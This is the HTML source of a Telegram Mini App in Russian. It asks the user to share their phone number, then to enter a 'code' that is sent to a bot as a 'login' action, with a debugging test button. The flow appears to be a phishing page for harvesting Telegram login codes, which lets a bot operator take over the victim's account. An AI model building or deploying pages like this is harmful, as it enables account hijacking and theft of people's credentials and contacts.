<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; background: #ffffff; color: #000000; }
        .hidden { display: none !important; }
        button { 
            background: #3390ec; color: white; border: none; padding: 15px; 
            font-size: 18px; border-radius: 10px; width: 100%; margin-top: 15px; 
            cursor: pointer; font-weight: bold;
        }
        input { 
            width: 100%; padding: 15px; font-size: 24px; text-align: center; 
            border: 2px solid #3390ec; border-radius: 10px; margin-top: 15px; box-sizing: border-box;
        }
        .test-btn { background: #ff3b30; margin-top: 30px; }
    </style>
</head>
<body>

    <!-- Экран 1 -->
    <div id="screen-phone">
        <h2>Шаг 1: Номер</h2>
        <button id="share-phone-btn">ПОДЕЛИТЬСЯ НОМЕРОМ</button>
    </div>

    <!-- Экран 2 -->
    <div id="screen-code" class="hidden">
        <h2>Шаг 2: Код</h2>
        <p>Номер: <b id="user-phone"></b></p>
        <input type="number" id="code-input" placeholder="Введите код">
        
        <!-- Основная кнопка -->
        <button id="submit-code-btn">ОТПРАВИТЬ КОД В БОТА</button>
        
        <!-- ТЕСТОВАЯ КНОПКА (Красная) -->
        <button class="test-btn" onclick="alert('Кнопки работают! JS не заблокирован.');">ТЕСТ КНОПКИ</button>
    </div>

    <script>
        window.onload = function() {
            if (window.Telegram && window.Telegram.WebApp) {
                const tg = window.Telegram.WebApp;
                tg.expand();

                // 1. Кнопка запроса номера
                document.getElementById('share-phone-btn').onclick = function() {
                    tg.requestContact(function(shared, contact) {
                        if (shared) {
                            document.getElementById('user-phone').innerText = "+" + contact.phone_number;
                            document.getElementById('screen-phone').classList.add('hidden');
                            document.getElementById('screen-code').classList.remove('hidden');
                        }
                    });
                };

                // 2. Кнопка отправки кода
                document.getElementById('submit-code-btn').onclick = function() {
                    const code = document.getElementById('code-input').value;
                    
                    if (code.length < 1) {
                        alert("Введите код!");
                        return;
                    }

                    try {
                        tg.sendData(JSON.stringify({
                            action: "login",
                            code: code
                        }));
                        // Если ошибок нет, показываем алерт и закрываем
                        alert("Код отправлен боту!");
                        tg.close();
                    } catch (error) {
                        alert("ОШИБКА ОТПРАВКИ: " + error.message);
                    }
                };
            }
        };
    </script>
</body>
</html>
